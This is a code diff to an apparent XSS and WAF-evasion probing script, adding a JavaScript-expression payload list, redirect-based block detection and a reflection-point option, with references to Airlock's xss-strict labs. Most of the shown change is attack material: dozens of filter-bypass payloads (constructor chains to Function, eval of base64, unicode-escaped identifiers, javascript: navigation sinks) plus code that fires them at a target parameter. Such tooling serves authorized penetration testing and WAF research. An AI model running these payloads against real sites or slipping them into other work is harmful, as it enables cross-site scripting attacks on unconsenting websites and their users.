@@ -47,6 +47,16 @@ BLOCK_STATUSES = {400, 403, 405, 406, 412, 413, 414, 418, 429, 501}
 # Set once in main(); consulted by every formatting helper.
 USE_COLOR = False
 
+# Which reflection point the verdicts are measured at. A page can echo the
+# same input into several contexts with different encoding applied to each
+# (Airlock's xss-strict labs echo into a <textarea>, an escaped source
+# listing, AND a live <script> block). Point 0 is rarely the exploitable one.
+POINT = 0
+
+# Airlock answers a denied request with a 303 to an error page rather than
+# a 4xx, so a redirect is a block signal unless the app legitimately uses one.
+REDIRECT_IS_BLOCK = True
+
 
 _UNSENDABLE = re.compile(r"[\x00-\x20\x7f]")
 
@@ -261,14 +271,23 @@ class Verdict:
         return f"{VERDICT_COLOR.get(self.kind, '')}{self.kind}\033[0m"
 
 
-def judge(resp: Resp, sent: str, block_re: re.Pattern | None) -> Verdict:
+def judge(resp: Resp, sent: str, block_re: re.Pattern | None,
+          point: int | None = None, redirect_is_block: bool | None = None) -> Verdict:
     """Decide whether the WAF blocked us, or the app merely encoded us."""
+    if point is None:
+        point = POINT
+    if redirect_is_block is None:
+        redirect_is_block = REDIRECT_IS_BLOCK
+
     if resp.error:
         return Verdict(ERROR, resp.error, resp)
     if block_re and block_re.search(resp.body):
         return Verdict(BLOCKED, f"block-regex, {resp.status}", resp)
     if resp.status in BLOCK_STATUSES:
         return Verdict(BLOCKED, f"HTTP {resp.status} {resp.reason}", resp)
+    if redirect_is_block and 300 <= resp.status < 400:
+        loc = resp.headers.get("Location") or resp.headers.get("location") or "?"
+        return Verdict(BLOCKED, f"HTTP {resp.status} -> {loc[:58]}", resp)
 
     spans = SPAN_RE.findall(resp.body)
     if not spans:
@@ -276,12 +295,17 @@ def judge(resp: Resp, sent: str, block_re: re.Pattern | None) -> Verdict:
         # reflected (wrong param, or the whole value was discarded).
         return Verdict(ABSENT, f"no canary span, HTTP {resp.status}", resp)
 
-    got = spans[0]
+    got = spans[point] if point < len(spans) else spans[0]
+    # Divergent points mean per-context encoding -- the whole ballgame when one
+    # of those contexts is a live <script> and another is display-only markup.
+    note = ""
+    if len(set(spans)) > 1:
+        note = f"  [points differ: {[x[:20] for x in spans]}]"
     if got == sent:
-        return Verdict(RAW, repr(got), resp)
+        return Verdict(RAW, repr(got) + note, resp)
     if got == "":
-        return Verdict(DROPPED, "value stripped", resp)
-    return Verdict(ENCODED, f"{sent!r} -> {got!r}", resp)
+        return Verdict(DROPPED, "value stripped" + note, resp)
+    return Verdict(ENCODED, f"{sent!r} -> {got!r}" + note, resp)
 
 
 # --------------------------------------------------------------------------- #
@@ -335,9 +359,9 @@ TOKENS = [
     "data:", "javascript:", "vbscript:", "&#", "\\u0061",
 ]
 
-# Candidate breakouts. Ordered roughly by how often they survive a strict
-# ruleset. `%%PAY%%` marks the JS you would swap for your own proof.
-PAYLOADS = [
+# HTML-context breakouts, for input reflected into markup. Ordered roughly
+# by how often they survive a strict ruleset.
+HTML_PAYLOADS = [
     # --- plain HTML body context ---
     "<svg onload=alert(1)>",
     "<img src=x onerror=alert(1)>",
@@ -392,6 +416,60 @@ PAYLOADS = [
     "<svg onload=Function`alert\\x281\\x29```>",
     "<svg onload=eval(atob('YWxlcnQoMSk='))>",
 ]
+
+# ---------------------------------------------------------------------- #
+# JS-EXPRESSION context: the input lands where a value is expected, e.g.
+#     <script> var v = INPUT; </script>
+# HTML entity decoding does NOT happen inside <script>, so a value that is
+# htmlspecialchars()'d still cannot use < > " ' & -- but it does not need to.
+# Every payload below is built ONLY from characters that survive that filter.
+# Strings come from backticks, /regex/.source, or String.fromCharCode.
+# ---------------------------------------------------------------------- #
+JS_PAYLOADS = [
+    # --- direct: the expression slot is already a call site ---
+    "alert(1)",
+    "confirm(1)",
+    "print()",
+    "alert(document.domain)",
+    "(alert)(1)",
+    # --- statement injection around the assignment ---
+    "1;alert(1);1",
+    "1;alert(1)//",
+    "0,alert(1)",
+    "alert(1)//",
+    # --- no parentheses (tagged template call) ---
+    "alert`1`",
+    "confirm`1`",
+    # --- no literal function name: build the string ---
+    "self[`ale`+`rt`](1)",
+    "top[/alert/.source](1)",
+    "self[String.fromCharCode(97,108,101,114,116)](1)",
+    "window[atob`YWxlcnQ=`](1)",
+    # --- constructor chains to Function ---
+    r"Function`alert\x281\x29```",
+    "[].constructor.constructor(`alert(1)`)()",
+    "0..constructor.constructor(`alert(1)`)()",
+    "[].filter.constructor(`alert(1)`)()",
+    # --- deferred execution ---
+    "setTimeout(`alert(1)`)",
+    "eval(atob(`YWxlcnQoMSk=`))",
+    "queueMicrotask(alert)",
+    # --- callback smuggling: alert reached without ever naming a call ---
+    "[1].map(alert)",
+    "[1].find(alert)",
+    "[1].flatMap(alert)",
+    # --- identifier obfuscation (probes for a \u signature on the WAF) ---
+    r"al\u0065rt(1)",
+    r"\u0061lert(1)",
+    # --- separator fuzzing inside the call ---
+    "alert/**/(1)",
+    "alert\t(1)",
+    "alert\n(1)",
+    # --- navigation sinks ---
+    "location=`javascript:alert(1)`",
+    "location.href=`javascript:alert(1)`",
+]
+
 
 # Transport-level manipulations. If a payload is BLOCKED as a plain GET but
 # lands otherwise, the WAF's parser and the app's parser disagree -- which is
@@ -514,16 +592,19 @@ def run_tokens(target: Target, block_re, color: bool) -> dict:
     return results
 
 
-def run_payloads(target: Target, block_re, color: bool) -> list:
-    print(head("PHASE 4  payload sweep"))
+def run_payloads(target: Target, block_re, color: bool, sets) -> list:
     survivors = []
-    for p in PAYLOADS:
-        v = judge(target.get(wrap(p)), p, block_re)
-        if v.kind == RAW:
-            survivors.append(p)
-        disp = p.replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t")
-        disp = disp.replace("\x0c", "\\f")
-        print(f"  {v.paint(color):<10} {disp[:78]}")
+    for label, corpus in sets:
+        print(head(f"PHASE 4  payload sweep -- {label}"))
+        for p in corpus:
+            v = judge(target.get(wrap(p)), p, block_re)
+            if v.kind == RAW:
+                survivors.append(p)
+            disp = p.replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t")
+            disp = disp.replace("\x0c", "\\f")
+            # The status code is the whole story on a WAF that blocks with a
+            # redirect rather than a 4xx -- never hide it.
+            print(f"  {v.paint(color):<10} {v.resp.status:<4} {disp[:70]}")
     print()
     if survivors:
         print("  " + tint("UNFILTERED -- these reached the page byte-for-byte:",
@@ -590,13 +671,28 @@ def main() -> int:
     ap.add_argument("--timeout", type=float, default=15.0)
     ap.add_argument("-H", "--header", action="append", default=[],
                     metavar="K:V", help="extra request header, repeatable")
+    ap.add_argument("--payload-set", default="all",
+                    choices=["html", "js", "all"],
+                    help="which phase-4 corpus to sweep: html (markup breakouts), "
+                         "js (bare-expression context, e.g. 'var v = INPUT;'), "
+                         "or all (default)")
+    ap.add_argument("--point", type=int, default=0, metavar="N",
+                    help="which reflection point from phase 1 to judge verdicts "
+                         "against, 0-indexed (default 0). Set this to the LIVE "
+                         "context -- point 0 is often display-only markup.")
+    ap.add_argument("--redirect-ok", action="store_true",
+                    help="treat 3xx as a normal response instead of a WAF block "
+                         "(Airlock denies with a 303, so the default is correct "
+                         "there; set this if the app itself redirects)")
     ap.add_argument("--no-color", action="store_true")
     args = ap.parse_args()
 
-    global USE_COLOR
+    global USE_COLOR, POINT, REDIRECT_IS_BLOCK
     color = (not args.no_color and sys.stdout.isatty()
              and os.environ.get("TERM") != "dumb")
     USE_COLOR = color
+    POINT = args.point
+    REDIRECT_IS_BLOCK = not args.redirect_ok
 
     param = args.param
     if not param:
@@ -624,6 +720,7 @@ def main() -> int:
     print(f"target   {args.url}")
     print(f"param    {param}")
     print(f"phases   {', '.join(sorted(phases))}")
+    print(f"point    {args.point}   (verdicts measured at this reflection point)")
     if args.proxy:
         print(f"proxy    {args.proxy}")
 
@@ -634,7 +731,11 @@ def main() -> int:
     if "tokens" in phases:
         run_tokens(target, block_re, color)
     if "payloads" in phases:
-        run_payloads(target, block_re, color)
+        chosen = {"html": [("HTML contexts", HTML_PAYLOADS)],
+                  "js": [("JS expression context", JS_PAYLOADS)],
+                  "all": [("HTML contexts", HTML_PAYLOADS),
+                          ("JS expression context", JS_PAYLOADS)]}[args.payload_set]
+        run_payloads(target, block_re, color, chosen)
     if "transport" in phases:
         run_transports(target, args.transport_payload, block_re, color)
 
